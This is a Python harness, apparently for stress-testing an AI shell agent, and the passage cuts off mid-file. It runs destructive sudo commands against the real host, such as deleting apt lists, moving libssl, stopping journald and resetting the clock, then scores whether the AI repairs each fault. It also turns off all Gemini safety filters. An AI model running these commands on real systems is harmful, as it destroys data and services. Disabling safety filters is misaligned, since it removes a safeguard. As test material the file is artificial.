#!/usr/bin/env python3
import os
import sys
import json
import time
import datetime
import subprocess
import random
import traceback
import hashlib
import shutil
import signal
import pickle
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
import threading
import re

import google.generativeai as genai

from colorama import init, Fore, Style
init(autoreset=True)


# Configure your API keys here
# You can either set the GEMINI_API_KEYS environment variable (comma-separated)
# OR manually enter them in the list below.
API_KEYS = os.getenv("GEMINI_API_KEYS", "").split(",")
if len(API_KEYS) == 1 and API_KEYS[0] == "":
    API_KEYS = [
        "ENTER_YOUR_API_KEY_HERE",
        "ENTER_ADDITIONAL_KEYS_IF_NEEDED",
    ]

SAFETY_SETTINGS = [
    {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
    {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
    {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
    {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"},
]

MAX_SELF_HEALING = 5
COMMAND_TIMEOUT = 120


class Category(Enum):
    DEPENDENCY_HELL = "Dependency Hell"
    KERNEL_SURGERY = "Kernel & Service Surgery"
    FILESYSTEM_DESTRUCTION = "Filesystem Destruction"
    OODA_LOGIC = "OODA Loop Logic & Strategy"
    RED_TEAM = "Red Team / Attack & Defense"
    CHAOS_ENGINEERING = "Chaos Engineering & Deep Recovery"


def run_cmd(cmd: str, timeout: int = COMMAND_TIMEOUT, shell: str = "bash") -> Dict:
    """Execute a command and return result."""
    try:
        if shell == "bash":
            result = subprocess.run(
                ["bash", "-c", cmd],
                capture_output=True,
                text=True,
                timeout=timeout,
                env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
            )
        else:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
            )
        return {
            "success": result.returncode == 0,
            "returncode": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "command": cmd
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Command timed out after {timeout}s", "command": cmd}
    except Exception as e:
        return {"success": False, "error": str(e), "command": cmd}


def run_cmd_sudo(cmd: str, timeout: int = COMMAND_TIMEOUT) -> Dict:
    """Execute a command with sudo."""
    return run_cmd(f"sudo {cmd}", timeout)


@dataclass
class TestScenario:
    """A single test scenario with breaker and validator."""
    id: int
    category: Category
    name: str
    description: str
    difficulty: int
    break_system: Callable[[], Dict]
    validate_fix: Callable[[], bool]
    cleanup: Optional[Callable[[], None]] = None
    
    def to_dict(self) -> Dict:
        return {
            "id": self.id,
            "category": self.category.value,
            "name": self.name,
            "description": self.description,
            "difficulty": self.difficulty
        }


@dataclass
class TestResult:
    """Result of a single test."""
    scenario_id: int
    scenario_name: str
    category: str
    success: bool
    self_healing_count: int
    healing_attempts: List[Dict] = field(default_factory=list)
    commands_executed: List[Dict] = field(default_factory=list)
    final_state: str = ""
    execution_time: float = 0.0
    error_message: str = ""
    ai_response: str = ""
    break_output: str = ""
    validation_output: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass 
class TestSession:
    """Overall test session."""
    start_time: str
    end_time: str = ""
    total_duration: float = 0.0
    total_scenarios: int = 0
    completed_scenarios: int = 0
    successful_scenarios: int = 0
    failed_scenarios: int = 0
    total_self_healing_count: int = 0
    total_commands_executed: int = 0
    api_quota_exhausted: bool = False
    category_stats: Dict[str, Dict] = field(default_factory=dict)
    results: List[TestResult] = field(default_factory=list)
    
    @property
    def success_rate(self) -> float:
        if self.completed_scenarios == 0:
            return 0.0
        return (self.successful_scenarios / self.completed_scenarios) * 100
    
    def to_dict(self) -> Dict:
        return {
            "start_time": self.start_time,
            "end_time": self.end_time,
            "total_duration_seconds": self.total_duration,
            "total_duration_formatted": str(datetime.timedelta(seconds=int(self.total_duration))),
            "total_scenarios": self.total_scenarios,
            "completed_scenarios": self.completed_scenarios,
            "successful_scenarios": self.successful_scenarios,
            "failed_scenarios": self.failed_scenarios,
            "success_rate_percent": round(self.success_rate, 2),
            "total_self_healing_count": self.total_self_healing_count,
            "total_commands_executed": self.total_commands_executed,
            "api_quota_exhausted": self.api_quota_exhausted,
            "category_stats": self.category_stats,
            "results": [r.to_dict() for r in self.results]
        }


class APIKeyManager:
    """Manages multiple API keys with rotation."""
    
    def __init__(self, api_keys: List[str]):
        self.api_keys = api_keys
        self.current_index = 0
        self.exhausted_keys = set()
        self.lock = threading.Lock()
        self.model = None
        self._initialize_model()
    
    def _initialize_model(self):
        try:
            genai.configure(api_key=self.api_keys[self.current_index])
            self.model = genai.GenerativeModel(
                "gemini-2.5-flash",
                generation_config={"temperature": 0.7},
                safety_settings=SAFETY_SETTINGS
            )
            print(f"{Fore.GREEN}✓ API initialized with key #{self.current_index + 1}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to initialize API: {e}{Style.RESET_ALL}")
    
    def switch_to_next_key(self) -> bool:
        with self.lock:
            self.exhausted_keys.add(self.current_index)
            for i in range(len(self.api_keys)):
                if i not in self.exhausted_keys:
                    self.current_index = i
                    genai.configure(api_key=self.api_keys[i])
                    self.model = genai.GenerativeModel(
                        "gemini-2.5-flash",
                        generation_config={"temperature": 0.7},
                        safety_settings=SAFETY_SETTINGS
                    )
                    print(f"{Fore.YELLOW}→ Switched to API key #{i + 1}{Style.RESET_ALL}")
                    return True
            return False
    
    def all_keys_exhausted(self) -> bool:
        return len(self.exhausted_keys) >= len(self.api_keys)
    
    def generate(self, prompt: str, max_retries: int = 3) -> Optional[str]:
        for attempt in range(max_retries):
            try:
                if self.model is None:
                    return None
                response = self.model.generate_content(prompt)
                return response.text
            except Exception as e:
                error_str = str(e).lower()
                if "quota" in error_str or "rate" in error_str or "limit" in error_str or "429" in error_str:
                    if not self.switch_to_next_key():
                        return None
                else:
                    if attempt == max_retries - 1:
                        print(f"{Fore.RED}API Error: {e}{Style.RESET_ALL}")
                        return None
                    time.sleep(2)
        return None


class StressTestLogger:
    """Comprehensive logging system."""
    
    def __init__(self, base_dir: str = ".", category_filter: Optional[str] = None):
        self.base_dir = base_dir
        self.category_filter = category_filter
        self.log_dir = os.path.join(base_dir, "stress_test_logs")
        os.makedirs(self.log_dir, exist_ok=True)
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        if category_filter:
            cat_name = category_filter.replace(" ", "_").replace("/", "_").replace("&", "and").lower()
            self.session_dir = os.path.join(self.log_dir, f"session_{cat_name}_{timestamp}")
        else:
            self.session_dir = os.path.join(self.log_dir, f"session_{timestamp}")
        os.makedirs(self.session_dir, exist_ok=True)
        
        prefix = f"{cat_name}_" if category_filter else ""
        self.main_log = os.path.join(self.session_dir, f"{prefix}main_results.json")
        self.hardest_log = os.path.join(self.session_dir, f"{prefix}hardest_questions.json")
        self.failed_log = os.path.join(self.session_dir, f"{prefix}failed_questions.json")
        self.training_log = os.path.join(self.session_dir, f"{prefix}ai_training_data.jsonl")
        self.checkpoint_file = os.path.join(self.session_dir, f"{prefix}checkpoint.pkl")
        self.execution_log = os.path.join(self.session_dir, f"{prefix}execution_detail.log")
        self.commands_log = os.path.join(self.session_dir, f"{prefix}all_commands.log")
        
        self.hardest_questions = []
        self.failed_questions = []
    
    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"[{timestamp}] [{level}] {message}\n"
        try:
            with open(self.execution_log, "a", encoding="utf-8") as f:
                f.write(log_line)
                f.flush()
        except Exception as e:
            print(f"Log write error: {e}")
        if level == "ERROR":
            print(f"{Fore.RED}{log_line.strip()}{Style.RESET_ALL}")
        elif level == "WARNING":
            print(f"{Fore.YELLOW}{log_line.strip()}{Style.RESET_ALL}")
    
    def log_command(self, cmd: str, result: Dict):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(self.commands_log, "a", encoding="utf-8") as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{timestamp}] Command: {cmd}\n")
                f.write(f"Success: {result.get('success', False)}\n")
                f.write(f"Return Code: {result.get('returncode', 'N/A')}\n")
                if result.get('stdout'):
                    f.write(f"STDOUT:\n{result['stdout'][:2000]}\n")
                if result.get('stderr'):
                    f.write(f"STDERR:\n{result['stderr'][:1000]}\n")
                if result.get('error'):
                    f.write(f"ERROR: {result['error']}\n")
                f.flush()
        except Exception as e:
            print(f"Command log write error: {e}")
    
    def add_hardest(self, result: TestResult):
        if result.self_healing_count >= 4:
            self.hardest_questions.append(result.to_dict())
            self._save_json(self.hardest_log, self.hardest_questions)
    
    def add_failed(self, result: TestResult):
        if not result.success:
            self.failed_questions.append(result.to_dict())
            self._save_json(self.failed_log, self.failed_questions)
    
    def add_training_data(self, result: TestResult):
        if result.success and result.self_healing_count > 0:
            training_entry = {
                "instruction": f"Fix this system issue: {result.scenario_name}",
                "input": {
                    "problem_description": result.scenario_name,
                    "category": result.category,
                    "initial_errors": [h.get("error", "") for h in result.healing_attempts if h.get("error")],
                    "healing_steps": result.healing_attempts,
                    "commands_tried": result.commands_executed
                },
                "output": {
                    "successful_commands": [c for c in result.commands_executed if c.get("success")],
                    "final_solution": result.ai_response
                },
                "metadata": {
                    "healing_count": result.self_healing_count,
                    "total_attempts": len(result.healing_attempts),
                    "execution_time": result.execution_time,
                    "difficulty": result.scenario_name
                }
            }
            with open(self.training_log, "a", encoding="utf-8") as f:
                f.write(json.dumps(training_entry, ensure_ascii=False) + "\n")
    
    def _save_json(self, path: str, data: Any):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    
    def save_session(self, session: TestSession):
        self._save_json(self.main_log, session.to_dict())
    
    def save_checkpoint(self, session: TestSession, current_index: int, scenarios: List):
        checkpoint = {
            "session": session,
            "current_index": current_index,
            "timestamp": datetime.datetime.now().isoformat()
        }
        with open(self.checkpoint_file, "wb") as f:
            pickle.dump(checkpoint, f)
    
    def load_checkpoint(self) -> Optional[Dict]:
        if os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, "rb") as f:
                    return pickle.load(f)
            except:
                pass
        return None


class TerminalUI:
    """Real-time terminal UI."""
    
    def __init__(self):
        self.start_time = time.time()
        self.total = 0
        self.current = 0
        self.passed = 0
        self.failed = 0
        self.healing = 0
        self.category = ""
        self.scenario = ""
        self.status = ""
    
    def set_total(self, total: int):
        self.total = total
    
    def update(self, current: int, category: str, scenario: str, 
               passed: int, failed: int, healing: int, status: str = ""):
        self.current = current
        self.category = category
        self.scenario = scenario[:50] + "..." if len(scenario) > 50 else scenario
        self.passed = passed
        self.failed = failed
        self.healing = healing
        self.status = status
        self._display()
    
    def _display(self):
        elapsed = time.time() - self.start_time
        elapsed_str = str(datetime.timedelta(seconds=int(elapsed)))
        
        if self.current > 0:
            avg = elapsed / self.current
            eta = (self.total - self.current) * avg
            eta_str = str(datetime.timedelta(seconds=int(eta)))
        else:
            eta_str = "..."
        
        progress = (self.current / self.total * 100) if self.total > 0 else 0
        bar_len = 40
        filled = int(bar_len * progress / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        
        rate = (self.passed / self.current * 100) if self.current > 0 else 0
        
        os.system('clear' if os.name != 'nt' else 'cls')
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║              ZAI SHELL "DOOMSDAY" STRESS TEST v2.0                   ║
║                    REAL SYSTEM BREAKING TEST                          ║
╠══════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.WHITE}║  Progress: [{bar}] {progress:5.1f}%  ║{Style.RESET_ALL}
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.GREEN}║  Scenario:    {self.current:3d} / {self.total}{Style.RESET_ALL}
{Fore.BLUE}║  Category:    {self.category[:40]}{Style.RESET_ALL}
{Fore.WHITE}║  Current:     {self.scenario}{Style.RESET_ALL}
{Fore.YELLOW}║  Status:      {self.status[:50]}{Style.RESET_ALL}
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.GREEN}║  ✓ Passed:        {self.passed:4d}     {Style.RESET_ALL}
{Fore.RED}║  ✗ Failed:        {self.failed:4d}     {Style.RESET_ALL}
{Fore.YELLOW}║  ↻ Self-Healing:  {self.healing:4d}     {Style.RESET_ALL}
{Fore.MAGENTA}║  Success Rate:    {rate:5.1f}%   {Style.RESET_ALL}
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}
{Fore.WHITE}║  Elapsed: {elapsed_str:10s}    ETA: {eta_str:10s}                        ║{Style.RESET_ALL}
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def create_test_scenarios() -> List[TestScenario]:
    """Create all test scenarios with real system breaking."""
    scenarios = []
    scenario_id = 0
    
    
    def break_pip():
        run_cmd_sudo("mv /usr/bin/pip3 /usr/bin/pip3.backup 2>/dev/null || true")
        run_cmd_sudo("rm -f /usr/local/bin/pip* 2>/dev/null || true")
        return {"broken": "pip command not found"}
    
    def validate_pip():
        result = run_cmd("pip3 --version")
        return result["success"]
    
    def cleanup_pip():
        run_cmd_sudo("mv /usr/bin/pip3.backup /usr/bin/pip3 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Broken pip installation",
        description="pip3 command has been removed. Reinstall pip.",
        difficulty=3,
        break_system=break_pip, validate_fix=validate_pip, cleanup=cleanup_pip,

    ))
    
    def break_apt_cache():
        run_cmd_sudo("rm -rf /var/lib/apt/lists/*")
        run_cmd_sudo("touch /var/lib/apt/lists/lock")
        run_cmd_sudo("chmod 000 /var/lib/apt/lists/lock")
        return {"broken": "apt cache corrupted"}
    
    def validate_apt_cache():
        result = run_cmd_sudo("apt-get update")
        return result["success"]
    
    def cleanup_apt_cache():
        run_cmd_sudo("chmod 644 /var/lib/apt/lists/lock 2>/dev/null || true")
        run_cmd_sudo("rm -f /var/lib/apt/lists/lock")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Corrupted APT cache and locked database",
        description="APT cache is corrupted and locked. Fix apt-get.",
        difficulty=4,
        break_system=break_apt_cache, validate_fix=validate_apt_cache, cleanup=cleanup_apt_cache,

    ))
    
    def break_python_symlinks():
        run_cmd_sudo("rm -f /usr/bin/python 2>/dev/null || true")
        run_cmd_sudo("ln -sf /bin/false /usr/bin/python 2>/dev/null || true")
        return {"broken": "python points to /bin/false"}
    
    def validate_python_symlinks():
        result = run_cmd("python3 --version")
        return result["success"] and "Python" in result.get("stdout", "")
    
    def cleanup_python_symlinks():
        run_cmd_sudo("rm -f /usr/bin/python")
        run_cmd_sudo("ln -sf /usr/bin/python3 /usr/bin/python 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Broken Python symlinks",
        description="Python symlink points to wrong location.",
        difficulty=2,
        break_system=break_python_symlinks, validate_fix=validate_python_symlinks, cleanup=cleanup_python_symlinks,

    ))
    
    def break_shared_lib():
        run_cmd_sudo("mkdir -p /tmp/lib_backup")
        run_cmd_sudo("mv /usr/lib/x86_64-linux-gnu/libssl.so.3 /tmp/lib_backup/ 2>/dev/null || true")
        return {"broken": "libssl.so.3 missing"}
    
    def validate_shared_lib():
        result = run_cmd("python3 -c 'import ssl; print(ssl.OPENSSL_VERSION)'")
        return result["success"]
    
    def cleanup_shared_lib():
        run_cmd_sudo("mv /tmp/lib_backup/libssl.so.3 /usr/lib/x86_64-linux-gnu/ 2>/dev/null || true")
        run_cmd_sudo("ldconfig")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Missing OpenSSL shared library",
        description="libssl.so.3 is missing, breaking Python SSL.",
        difficulty=6,
        break_system=break_shared_lib, validate_fix=validate_shared_lib, cleanup=cleanup_shared_lib,

    ))
    
    def break_npm():
        run_cmd_sudo("rm -rf /usr/local/lib/node_modules/npm 2>/dev/null || true")
        run_cmd_sudo("rm -f /usr/local/bin/npm 2>/dev/null || true")
        run_cmd_sudo("rm -f /usr/bin/npm 2>/dev/null || true")
        return {"broken": "npm not found"}
    
    def validate_npm():
        result = run_cmd("npm --version")
        return result["success"]
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Completely broken npm installation",
        description="npm has been removed. Reinstall Node.js npm.",
        difficulty=4,
        break_system=break_npm, validate_fix=validate_npm, cleanup=None,

    ))
    
    def break_dpkg():
        run_cmd_sudo("touch /var/lib/dpkg/lock-frontend")
        run_cmd_sudo("echo 'status: error' > /var/lib/dpkg/status-old 2>/dev/null || true")
        return {"broken": "dpkg interrupted"}
    
    def validate_dpkg():
        result = run_cmd_sudo("dpkg --configure -a")
        return result["success"]
    
    def cleanup_dpkg():
        run_cmd_sudo("rm -f /var/lib/dpkg/lock-frontend")
        run_cmd_sudo("rm -f /var/lib/dpkg/lock")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="DPKG database locked and interrupted",
        description="dpkg was interrupted and is now locked.",
        difficulty=3,
        break_system=break_dpkg, validate_fix=validate_dpkg, cleanup=cleanup_dpkg,

    ))
    
    def break_virtualenv():
        run_cmd("rm -rf /tmp/test_venv")
        run_cmd("python3 -m venv /tmp/test_venv")
        run_cmd("rm -f /tmp/test_venv/bin/activate")
        run_cmd("rm -f /tmp/test_venv/bin/python*")
        return {"broken": "virtualenv corrupted"}
    
    def validate_virtualenv():
        result = run_cmd("source /tmp/test_venv/bin/activate && python --version")
        return result["success"]
    
    def cleanup_virtualenv():
        run_cmd("rm -rf /tmp/test_venv")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Corrupted Python virtualenv",
        description="Virtualenv activation scripts are missing.",
        difficulty=4,
        break_system=break_virtualenv, validate_fix=validate_virtualenv, cleanup=cleanup_virtualenv,

    ))
    
    def break_pythonpath():
        run_cmd("echo 'export PYTHONPATH=/nonexistent' >> ~/.bashrc")
        return {"broken": "PYTHONPATH broken"}
    
    def validate_pythonpath():
        result = run_cmd("unset PYTHONPATH && python3 -c 'import sys; print(sys.path)'")
        return result["success"]
    
    def cleanup_pythonpath():
        run_cmd("sed -i '/PYTHONPATH.*nonexistent/d' ~/.bashrc")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Broken PYTHONPATH environment",
        description="PYTHONPATH points to nonexistent directory.",
        difficulty=2,
        break_system=break_pythonpath, validate_fix=validate_pythonpath, cleanup=cleanup_pythonpath,

    ))
    
    def break_gem():
        run_cmd_sudo("chmod 000 /var/lib/gems 2>/dev/null || true")
        return {"broken": "gem path inaccessible"}
    
    def validate_gem():
        result = run_cmd("gem list")
        return result["success"]
    
    def cleanup_gem():
        run_cmd_sudo("chmod 755 /var/lib/gems 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Ruby gems path permission denied",
        description="Cannot access gem installation directory.",
        difficulty=3,
        break_system=break_gem, validate_fix=validate_gem, cleanup=cleanup_gem,

    ))
    
    def break_cargo():
        run_cmd("rm -rf ~/.cargo/bin 2>/dev/null || true")
        run_cmd("mkdir -p ~/.cargo/bin")
        run_cmd("touch ~/.cargo/bin/cargo")
        return {"broken": "cargo is empty file"}
    
    def validate_cargo():
        result = run_cmd("cargo --version 2>/dev/null || ~/.cargo/bin/cargo --version")
        return result["success"] and "cargo" in result.get("stdout", "").lower()
    
    def cleanup_cargo():
        run_cmd("rm -rf ~/.cargo")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.DEPENDENCY_HELL,
        name="Corrupted Rust cargo installation",
        description="Cargo binary is corrupted.",
        difficulty=4,
        break_system=break_cargo, validate_fix=validate_cargo, cleanup=cleanup_cargo,

    ))
    
    
    def break_systemd_service():
        run_cmd_sudo("systemctl stop cron 2>/dev/null || true")
        run_cmd_sudo("mv /usr/sbin/cron /usr/sbin/cron.backup 2>/dev/null || true")
        run_cmd_sudo("touch /usr/sbin/cron")
        run_cmd_sudo("chmod +x /usr/sbin/cron")
        return {"broken": "cron service broken"}
    
    def validate_systemd_service():
        result = run_cmd_sudo("systemctl is-active cron")
        return "active" in result.get("stdout", "")
    
    def cleanup_systemd_service():
        run_cmd_sudo("mv /usr/sbin/cron.backup /usr/sbin/cron 2>/dev/null || true")
        run_cmd_sudo("systemctl start cron 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Broken cron service binary",
        description="Cron daemon binary is corrupted and service fails.",
        difficulty=5,
        break_system=break_systemd_service, validate_fix=validate_systemd_service, cleanup=cleanup_systemd_service,

    ))
    
    def break_zombies():
        run_cmd("nohup bash -c 'sleep 1 & sleep 2 & wait' &>/dev/null &")
        run_cmd("""
        python3 -c '
import os, time
for _ in range(5):
    pid = os.fork()
    if pid == 0:
        os._exit(0)
time.sleep(0.5)
' &
        """)
        return {"broken": "zombie processes created"}
    
    def validate_zombies():
        result = run_cmd("ps aux | grep defunct | grep -v grep | wc -l")
        count = int(result.get("stdout", "0").strip() or "0")
        return count == 0
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Zombie processes cleanup",
        description="Multiple zombie (defunct) processes exist.",
        difficulty=4,
        break_system=break_zombies, validate_fix=validate_zombies, cleanup=None,

    ))
    
    def break_readonly():
        run_cmd_sudo("mkdir -p /tmp/readonly_test")
        run_cmd_sudo("mount -t tmpfs -o size=10M,ro tmpfs /tmp/readonly_test")
        return {"broken": "filesystem read-only"}
    
    def validate_readonly():
        result = run_cmd("touch /tmp/readonly_test/testfile && rm /tmp/readonly_test/testfile")
        return result["success"]
    
    def cleanup_readonly():
        run_cmd_sudo("umount /tmp/readonly_test 2>/dev/null || true")
        run_cmd_sudo("rmdir /tmp/readonly_test 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Read-only filesystem",
        description="A mounted filesystem is read-only.",
        difficulty=3,
        break_system=break_readonly, validate_fix=validate_readonly, cleanup=cleanup_readonly,

    ))
    
    def break_nginx_config():
        run_cmd_sudo("mkdir -p /tmp/nginx_test")
        run_cmd_sudo("echo 'server {' > /tmp/nginx_test/nginx.conf")
        run_cmd_sudo("echo '    listen 80;' >> /tmp/nginx_test/nginx.conf")
        run_cmd_sudo("echo '    server_name localhost;' >> /tmp/nginx_test/nginx.conf")
        run_cmd_sudo("echo '    invalid_directive yes;' >> /tmp/nginx_test/nginx.conf")
        run_cmd_sudo("echo '}' >> /tmp/nginx_test/nginx.conf")
        return {"broken": "nginx config has invalid directive"}
    
    def validate_nginx_config():
        result = run_cmd("grep 'invalid_directive' /tmp/nginx_test/nginx.conf 2>/dev/null")
        return not result["success"] or not run_cmd("test -f /tmp/nginx_test/nginx.conf")["success"]
    
    def cleanup_nginx_config():
        run_cmd_sudo("rm -rf /tmp/nginx_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Invalid web server configuration",
        description="Web server config file has an invalid directive.",
        difficulty=4,
        break_system=break_nginx_config, validate_fix=validate_nginx_config, cleanup=cleanup_nginx_config,

    ))
    
    def break_swap():
        run_cmd_sudo("swapoff -a")
        return {"broken": "swap disabled"}
    
    def validate_swap():
        result = run_cmd("swapon --show")
        return result["success"] and len(result.get("stdout", "").strip()) > 0
    
    def cleanup_swap():
        run_cmd_sudo("swapon -a 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Swap space disabled",
        description="All swap partitions have been disabled.",
        difficulty=2,
        break_system=break_swap, validate_fix=validate_swap, cleanup=cleanup_swap,

    ))
    
    def break_time():
        run_cmd_sudo("timedatectl set-ntp false 2>/dev/null || true")
        run_cmd_sudo("date -s '2020-01-01 00:00:00' 2>/dev/null || true")
        return {"broken": "system time wrong"}
    
    def validate_time():
        result = run_cmd("date +%Y")
        year = result.get("stdout", "").strip()
        return year and int(year) >= 2024
    
    def cleanup_time():
        run_cmd_sudo("timedatectl set-ntp true 2>/dev/null || true")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="System clock set to wrong time",
        description="System date is set to year 2020.",
        difficulty=3,
        break_system=break_time, validate_fix=validate_time, cleanup=cleanup_time,

    ))
    
    def break_kernel_module():
        run_cmd_sudo("modprobe -r loop 2>/dev/null || true")
        return {"broken": "loop module unloaded"}
    
    def validate_kernel_module():
        result = run_cmd("lsmod | grep loop")
        return result["success"] and "loop" in result.get("stdout", "")
    
    def cleanup_kernel_module():
        run_cmd_sudo("modprobe loop")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Essential kernel module unloaded",
        description="The loop kernel module has been unloaded.",
        difficulty=3,
        break_system=break_kernel_module, validate_fix=validate_kernel_module, cleanup=cleanup_kernel_module,

    ))
    
    def break_tmp_full():
        run_cmd_sudo("dd if=/dev/zero of=/tmp/fillfile bs=1M count=100 2>/dev/null || true")
        return {"broken": "/tmp filling up"}
    
    def validate_tmp_full():
        result = run_cmd("df /tmp | tail -1 | awk '{print $5}' | tr -d '%'")
        usage = int(result.get("stdout", "100").strip() or "100")
        return usage < 90
    
    def cleanup_tmp_full():
        run_cmd_sudo("rm -f /tmp/fillfile")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Disk space exhausted on /tmp",
        description="/tmp is running out of space.",
        difficulty=2,
        break_system=break_tmp_full, validate_fix=validate_tmp_full, cleanup=cleanup_tmp_full,

    ))
    
    def break_hostname():
        run_cmd_sudo("echo '' > /etc/hostname")
        run_cmd_sudo("hostname ''")
        return {"broken": "hostname empty"}
    
    def validate_hostname():
        result = run_cmd("hostname")
        name = result.get("stdout", "").strip()
        return len(name) > 0 and name != "(none)"
    
    def cleanup_hostname():
        run_cmd_sudo("echo 'ubuntu' > /etc/hostname")
        run_cmd_sudo("hostname ubuntu")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Empty hostname configuration",
        description="System hostname is empty.",
        difficulty=2,
        break_system=break_hostname, validate_fix=validate_hostname, cleanup=cleanup_hostname,

    ))
    
    def break_journald():
        run_cmd_sudo("systemctl stop systemd-journald")
        run_cmd_sudo("rm -rf /var/log/journal/* 2>/dev/null || true")
        return {"broken": "journald stopped"}
    
    def validate_journald():
        result = run_cmd_sudo("systemctl is-active systemd-journald")
        return "active" in result.get("stdout", "")
    
    def cleanup_journald():
        run_cmd_sudo("systemctl start systemd-journald")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.KERNEL_SURGERY,
        name="Systemd journal service stopped",
        description="systemd-journald is not running.",
        difficulty=3,
        break_system=break_journald, validate_fix=validate_journald, cleanup=cleanup_journald,

    ))
    
    def break_log_rotation():
        run_cmd_sudo("mkdir -p /tmp/log_test")
        run_cmd_sudo("dd if=/dev/zero of=/tmp/log_test/huge.log bs=1M count=50 2>/dev/null || true")
        run_cmd_sudo("touch /tmp/log_test/app.log")
        return {"broken": "Log file is 50MB and needs rotation"}
    
    def validate_log_rotation():
        result = run_cmd("ls -la /tmp/log_test/*.log.* 2>/dev/null || test ! -f /tmp/log_test/huge.log")
        huge_exists = run_cmd("test -f /tmp/log_test/huge.log")
        return not huge_exists["success"] or result["success"]
    
    def cleanup_log_rotation():
        run_cmd_sudo("rm -rf /tmp/log_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Large log file needs rotation",
        description="A 50MB log file at /tmp/log_test/huge.log needs to be rotated or deleted.",
        difficulty=3,
        break_system=break_log_rotation, validate_fix=validate_log_rotation, cleanup=cleanup_log_rotation,

    ))
    
    def break_disk_usage():
        run_cmd_sudo("mkdir -p /tmp/disk_test")
        for i in range(5):
            run_cmd_sudo(f"dd if=/dev/zero of=/tmp/disk_test/file{i}.dat bs=1M count=20 2>/dev/null || true")
        return {"broken": "100MB of junk files in /tmp/disk_test"}
    
    def validate_disk_usage():
        result = run_cmd("du -sm /tmp/disk_test 2>/dev/null | awk '{print $1}'")
        size = int(result.get("stdout", "100").strip() or "100")
        return size < 10
    
    def cleanup_disk_usage():
        run_cmd_sudo("rm -rf /tmp/disk_test")
    
    scenario_id += 1
    scenarios.append(TestScenario(
        id=scenario_id, category=Category.OODA_LOGIC,
        name="Disk space cleanup needed",
        description="Directory /tmp/disk_test has 100MB of junk files that need to be removed.",
        difficulty=2,
        break_system=break_disk_usage, validate_fix=validate_disk_usage, cleanup=cleanup_disk_usage,

    ))
    
    def break_process_limit():
        run_cmd_sudo("mkdir -p /tmp/proc_test")
        run_cmd("for i in $(seq 1 20); do sleep 3600 & done")
        run_cmd("echo 'TOO_MANY_SLEEP' > /tmp/proc_test/status")
        return {"broken": "20 unnecessary sleep processes running"}
